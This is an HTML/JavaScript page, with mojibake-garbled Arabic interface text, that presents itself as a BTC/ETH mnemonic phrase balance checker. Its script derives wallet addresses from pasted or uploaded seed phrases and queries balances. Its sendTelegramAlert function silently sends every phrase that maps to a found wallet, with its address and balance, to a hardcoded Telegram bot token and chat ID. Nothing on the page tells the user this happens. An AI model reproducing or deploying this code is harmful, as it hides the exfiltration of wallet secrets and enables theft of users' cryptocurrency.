<body>
    <h2>ŸÅÿßÿ≠ÿµ ÿπÿ®ÿßÿ±ÿßÿ™ Mnemonic (BTC/ETH)</h2>
    <input type="file" id="fileInput" accept=".txt">
    <textarea id="phraseInput" placeholder="ÿ£Ÿà ÿßŸÑÿµŸÇ ÿπÿ®ÿßÿ±ÿßÿ™ŸÉ ŸáŸÜÿßÿå ÿ≥ÿ∑ÿ± ŸÑŸÉŸÑ ÿπÿ®ÿßÿ±ÿ©"></textarea>
    <button id="startButton" onclick="scanFile()" disabled>ÿ®ÿØÿ° ÿßŸÑŸÅÿ≠ÿµ</button>
    <audio id="gunshot" src="gunshot.mp3" preload="auto"></audio>
    <div id="summary">ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑŸÅÿ≠ÿµ ÿ®ÿπÿØ.</div>
    <div id="results"></div>

    <script>
        // Constants for Telegram API and CORS proxy
        const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
        const TELEGRAM_CHAT_ID   = '-4913064483';
        const CORS_PROXY_URL = 'https://corsproxy.io/?';

        // Get references to UI elements
        const fileInput = document.getElementById('fileInput');
        const phraseInput = document.getElementById('phraseInput');
        const startButton = document.getElementById('startButton');
        const summaryDiv = document.getElementById('summary');
        const resultsDiv = document.getElementById('results');
        const gunshotAudio = document.getElementById('gunshot');

        /**
         * Updates the state of the "Start Scan" button based on input availability.
         */
        function updateScanButtonState() {
            startButton.disabled = !(fileInput.files.length > 0 || phraseInput.value.trim().length > 0);
        }

        // Add event listeners to update button state
        fileInput.addEventListener('change', updateScanButtonState);
        phraseInput.addEventListener('input', updateScanButtonState);

        // Initial check on page load
        document.addEventListener('DOMContentLoaded', updateScanButtonState);


        /**
         * Shows a custom message box instead of native alert().
         * @param {string} message The message to display.
         */
        function showMessageBox(message) {
            const overlay = document.createElement('div');
            overlay.className = 'message-box-overlay';
            overlay.innerHTML = `
                <div class="message-box">
                    <p>${message}</p>
                    <button onclick="this.closest('.message-box-overlay').remove()">ŸÖŸàÿßŸÅŸÇ</button>
                </div>
            `;
            document.body.appendChild(overlay);
        }

        /**
         * Sends an alert message to a configured Telegram chat.
         * @param {string} text The text message to send.
         */
        async function sendTelegramAlert(text) {
          try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
            await fetch(url);
          } catch (e) {
            console.error('Telegram alert failed', e);
          }
        }

        /**
         * Fetches data from a given URL using a CORS proxy and checks for rate limits.
         * Returns the full Response object for detailed status checking.
         * @param {string} url The original API URL to fetch.
         * @returns {Promise<Response>} The Response object from the fetch call.
         * @throws {Error} If a rate limit (429 status) is detected.
         */
        async function checkApi(url) {
            const proxiedUrl = `${CORS_PROXY_URL}${encodeURIComponent(url)}`;
            const res = await fetch(proxiedUrl);
            if (res.status === 429) {
                throw new Error('rate_limit');
            }
            // Return the full response object for downstream functions to handle status and JSON parsing
            return res;
        }

        /**
         * Checks the Bitcoin balance for a given address using Blockstream API.
         * @param {string} addr The Bitcoin address.
         * @returns {Promise<{exists: boolean, balance: number, unit: string}>} Object indicating existence, balance (in BTC), and unit.
         */
        async function checkBtc(addr) {
            try {
                const response = await checkApi(`https://blockstream.info/api/address/${addr}`);
                if (!response.ok) { // If HTTP status is not 2xx (e.g., 404 Not Found for non-existent addresses)
                    console.warn(`BTC check for ${addr} returned status ${response.status}: ${response.statusText}`);
                    // If the API returns non-2xx, we consider the address as not existing in its index.
                    return { exists: false, balance: 0, unit: 'BTC' };
                }
                
                // If response.ok is true (HTTP 2xx), then the address is considered "found" by the API.
                // We then try to parse its balance.
                const data = await response.json();
                let totalSatoshi = 0;
                // Blockstream provides chain_stats if the address has had any activity.
                // If chain_stats is present, we calculate balance.
                // If response.ok but no chain_stats, it implies an existing address with no activity.
                if (data && data.chain_stats) {
                    totalSatoshi = data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
                }
                return { exists: true, balance: totalSatoshi / 100000000, unit: 'BTC' };

            } catch (error) {
                if (error.message === 'rate_limit') throw error; // Re-throw rate limit
                // This catch handles network errors or JSON parsing errors from checkApi
                console.error(`BTC check for ${addr} failed (network/JSON parsing error):`, error);
                return { exists: false, balance: 0, unit: 'BTC' };
            }
        }

        /**
         * Checks the Ethereum balance for a given address using Etherscan API.
         * @param {string} addr The Ethereum address.
         * @returns {Promise<{exists: boolean, balance: number, unit: string}>} Object indicating existence, balance (in ETH), and unit.
         */
        async function checkEth(addr) {
            try {
                const response = await checkApi(`https://api.etherscan.io/api?module=account&action=balance&address=${addr}&tag=latest`);
                if (!response.ok) { // If HTTP status is not 2xx
                    console.warn(`ETH check for ${addr} returned status ${response.status}: ${response.statusText}`);
                    return { exists: false, balance: 0, unit: 'ETH' };
                }
                // If response.ok is true, the address is considered "found" by the API.
                // Now parse balance.
                const json = await response.json();
                let balanceWei = 0;
                // Etherscan API returns 'result' as a string, typically "0" for empty or the balance.
                if (json && typeof json.result === 'string' && !isNaN(parseFloat(json.result))) {
                    balanceWei = parseFloat(json.result);
                }
                return { exists: true, balance: balanceWei / 1e18, unit: 'ETH' };

            } catch (error) {
                if (error.message === 'rate_limit') throw error; // Re-throw rate limit
                console.error(`ETH check for ${addr} failed (network/JSON parsing error):`, error);
                return { exists: false, balance: 0, unit: 'ETH' };
            }
        }

        /**
         * Derives the first BTC address (P2PKH) from a given seed.
         * Derivation path: m/44'/0'/0'/0/0
         * @param {Buffer} seed The master seed buffer.
         * @returns {string} The derived BTC address.
         */
        function deriveBtc(seed) {
          const root  = hdkey.fromMasterSeed(seed);
          const child = root.derive("m/44'/0'/0'/0/0"); // BIP44 path for Bitcoin mainnet
          return bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
        }

        /**
         * Derives the first ETH address from a given seed.
         * Derivation path: m/44'/60'/0'/0/0
         * @param {Buffer} seed The master seed buffer.
         * @returns {string} The derived ETH address (0x prefixed).
         */
        function deriveEth(seed) {
          const root  = hdkey.fromMasterSeed(seed);
          const child = root.derive("m/44'/60'/0'/0/0"); // BIP44 path for Ethereum
          // pubToAddress expects uncompressed public key.
          return '0x' + ethereumjs.Util.pubToAddress(child.publicKey, false).toString('hex'); // 'false' for uncompressed pubkey
        }

        /**
         * Scans a single BIP39 mnemonic phrase for balances on BTC and ETH chains.
         * @param {string} phrase The 12-word mnemonic phrase.
         * @returns {Promise<Object>} An object indicating the scan status, chain, address, and balance.
         */
        async function scanPhrase(phrase) {
            // Check if window.bip39 is defined before using it
            if (typeof window.bip39 === 'undefined' || !window.bip39.validateMnemonic(phrase)) {
                console.error("BIP39 library is not loaded or the mnemonic is invalid:", phrase);
                return { status: 'not_found' }; // Invalid mnemonic or BIP39 not available
            }

            // Derive seed from mnemonic
            const seed = await window.bip39.mnemonicToSeed(phrase);

            // Derive addresses for BTC and ETH chains
            const btcAddr = deriveBtc(seed);
            const ethAddr = deriveEth(seed);

            // Check BTC balance and existence
            const btcResult = await checkBtc(btcAddr);
            if (btcResult.balance > 0) {
                return { status: 'found_funds', chain: 'BTC', addr: btcAddr, balance: btcResult.balance, unit: btcResult.unit };
            }
            
            // Check ETH balance and existence
            const ethResult = await checkEth(ethAddr);
            if (ethResult.balance > 0) {
                return { status: 'found_funds', chain: 'ETH', addr: ethAddr, balance: ethResult.balance, unit: ethResult.unit };
            }
            
            // If no funds found, check if wallets exist with zero balance based on API's "existence"
            if (btcResult.exists) {
                return { status: 'found_empty', chain: 'BTC', addr: btcAddr, balance: btcResult.balance, unit: btcResult.unit };
            }
            if (ethResult.exists) {
                return { status: 'found_empty', chain: 'ETH', addr: ethAddr, balance: ethResult.balance, unit: ethResult.unit };
            }
            
            return { status: 'not_found' }; // Genuinely not found (invalid mnemonic or API didn't confirm existence via 2xx status)
        }

        /**
         * Main function to handle file reading/textarea input and batch scanning of mnemonic phrases.
         * Updates UI with progress and results, handles errors and rate limits.
         */
        async function scanFile() {
            let lines = [];

            // Prioritize file input
            if (fileInput.files.length > 0) {
                const file = fileInput.files[0];
                lines = await new Promise((resolve) => {
                    const fileReader = new FileReader();
                    fileReader.onload = (e) => {
                        const rawLines = e.target.result.trim().split(/\r?\n/);
                        resolve(rawLines.filter(line => line.trim() !== ''));
                    };
                    fileReader.readAsText(file, 'UTF-8');
                });
            } else if (phraseInput.value.trim().length > 0) {
                // Fallback to textarea input
                const rawLines = phraseInput.value.trim().split(/\r?\n/);
                lines = rawLines.filter(line => line.trim() !== '');
            } else {
                // Should not happen if button state is managed correctly, but as a fallback
                showMessageBox('Ÿäÿ±ÿ¨Ÿâ ÿ±ŸÅÿπ ŸÖŸÑŸÅ ÿßŸÑÿπÿ®ÿßÿ±ÿßÿ™ ÿ£Ÿà ŸÑÿµŸÇ ÿßŸÑÿπÿ®ÿßÿ±ÿßÿ™ ŸÅŸä ÿßŸÑŸÖŸÜÿ∑ŸÇÿ© ÿßŸÑŸÜÿµŸäÿ© ÿ£ŸàŸÑÿßŸã.');
                return;
            }

            if (lines.length === 0) {
                showMessageBox('ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿπÿ®ÿßÿ±ÿßÿ™ ÿµÿßŸÑÿ≠ÿ© ŸÅŸä ÿßŸÑÿ•ÿØÿÆÿßŸÑ.');
                summaryDiv.innerHTML = 'ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑŸÅÿ≠ÿµ ÿ®ÿπÿØ.';
                resultsDiv.innerHTML = '';
                return;
            }


            const totalPhrases = lines.length;
            resultsDiv.innerHTML = ''; // Clear previous results
            
            let fundsFoundCount = 0;
            let emptyFoundCount = 0;
            let notFoundCount = 0;
            let scanStopped = false;

            // Disable button during scan
            startButton.disabled = true;

            // Iterate through each mnemonic phrase
            for (let i = 0; i < totalPhrases && !scanStopped; i++) {
                // Update live progress counter
                summaryDiv.innerHTML = `üöÄ ÿ™ŸÖ ŸÅÿ≠ÿµ <span class="count">${i + 1}/${totalPhrases}</span> ÿπÿ®ÿßÿ±ÿ©`;
                
                const currentPhrase = lines[i];

                try {
                    const scanResult = await scanPhrase(currentPhrase);

                    switch (scanResult.status) {
                        case 'found_funds':
                            fundsFoundCount++;
                            resultsDiv.innerHTML += `<div class="good">‚úÖ [${scanResult.chain}] ${currentPhrase} ‚Üí ${scanResult.addr} (${scanResult.balance.toFixed(8)} ${scanResult.unit})</div>`;
                            gunshotAudio.currentTime = 0; // Rewind to start
                            gunshotAudio.play().catch(e => console.error("Error playing gunshot sound:", e));
                            sendTelegramAlert(`Found ${scanResult.chain} wallet with funds:\nPhrase: ${currentPhrase}\nAddress: ${scanResult.addr}\nBalance: ${scanResult.balance.toFixed(8)} ${scanResult.unit}`);
                            break;
                        case 'found_empty':
                            emptyFoundCount++;
                            resultsDiv.innerHTML += `<div class="empty-wallet">‚ö™Ô∏è [${scanResult.chain}] ${currentPhrase} ‚Üí ${scanResult.addr} (0 ${scanResult.unit})</div>`;
                            sendTelegramAlert(`Found empty ${scanResult.chain} wallet:\nPhrase: ${currentPhrase}\nAddress: ${scanResult.addr}\nBalance: 0 ${scanResult.unit}`);
                            break;
                        case 'not_found':
                            notFoundCount++;
                            resultsDiv.innerHTML += `<div class="bad">‚ùå ${currentPhrase}</div>`;
                            break;
                    }
                } catch (error) {
                    if (error.message === 'rate_limit') {
                        scanStopped = true;
                        resultsDiv.innerHTML += `<div class="limit">‚ö†Ô∏è ÿ™ŸÖ ÿßŸÑŸàÿµŸàŸÑ ŸÑŸÑÿ≠ÿØ ÿßŸÑÿ£ŸÇÿµŸâ ŸÑÿ∑ŸÑÿ®ÿßÿ™ APIÿå ÿ™ŸàŸÇŸÅ ÿßŸÑŸÅÿ≠ÿµ.</div>`;
                        console.warn('API rate limit reached. Scanning stopped.');
                    } else {
                        // For other unexpected errors, treat as not found for counting purposes
                        notFoundCount++;
                        resultsDiv.innerHTML += `<div class="bad">‚ùå ${currentPhrase} (ÿÆÿ∑ÿ£: ${error.message || 'ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ'})</div>`;
                        console.error(`Error scanning phrase ${currentPhrase}:`, error);
                    }
                }
                // Automatically scroll to the bottom of the results div
                resultsDiv.scrollTop = resultsDiv.scrollHeight;
            }

            // Display final summary totals
            summaryDiv.innerHTML = `
                <br>
                <span class="good">Found with funds: ${fundsFoundCount}</span> | 
                <span class="empty-wallet">Found empty: ${emptyFoundCount}</span> |
                <span class="bad">Not found: ${notFoundCount}</span>
            `;
            if (scanStopped) {
                summaryDiv.innerHTML += `<br><span class="limit">ÿ™ŸàŸÇŸÅ ÿßŸÑŸÅÿ≠ÿµ ÿ®ÿ≥ÿ®ÿ® ÿ™ÿ¨ÿßŸàÿ≤ ÿßŸÑÿ≠ÿØ ÿßŸÑÿ£ŸÇÿµŸâ ŸÑÿ∑ŸÑÿ®ÿßÿ™ API.</span>`;
            }

            // Re-enable button after scan
            updateScanButtonState();
        }
    </script>
